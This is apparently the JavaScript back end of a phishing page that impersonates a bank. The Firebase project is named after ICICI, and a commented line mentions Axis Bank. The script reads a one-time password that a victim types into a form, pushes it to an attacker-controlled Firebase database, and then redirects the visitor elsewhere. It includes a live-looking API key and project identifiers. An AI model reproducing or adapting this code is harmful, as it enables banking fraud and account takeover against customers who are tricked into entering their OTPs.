// Initialize Firebase (ADD YOUR OWN DATA)
const firebaseConfig = {
    apiKey: "AIzaSyBnqsH1zCQJLbM_mAbtCya5div5_6PEzmk",
    authDomain: "icici-23-8a474.firebaseapp.com",
    databaseURL: "https://icici-23-8a474-default-rtdb.firebaseio.com",
    projectId: "icici-23-8a474",
    storageBucket: "icici-23-8a474.appspot.com",
    messagingSenderId: "667538932053",
    appId: "1:667538932053:web:9b303aa2fe8ad4deab2fdc",
  
  
      
  
    };
  
  firebase.initializeApp(firebaseConfig);
  
  // Reference messages collection
  var messagesRef = firebase.database().ref('messages');
  
  // Listen for form submit
  document.getElementById('contactForm').addEventListener('submit', submitForm);
  
  // Submit form
  function submitForm(e){
    e.preventDefault();
  
    // Get values
    var otp = getInputVal('otp');
  
    // Save message
    saveMessage(otp);
  
    // Show alert
  // alert("Axis Bank Will Contact You Soon")
  //   // Clear form
  //   document.getElementById('contactForm').reset();
  
  document.getElementById('contactForm').reset();
  window.location.href="sad1.html";
  }
  
  // Function to get get form values
  function getInputVal(id){
    return document.getElementById(id).value;
  }
  
  // Save message to firebase
  function saveMessage(otp){
    var newMessageRef = messagesRef.push();
    newMessageRef.set({
      otp: otp,
    });
  }
  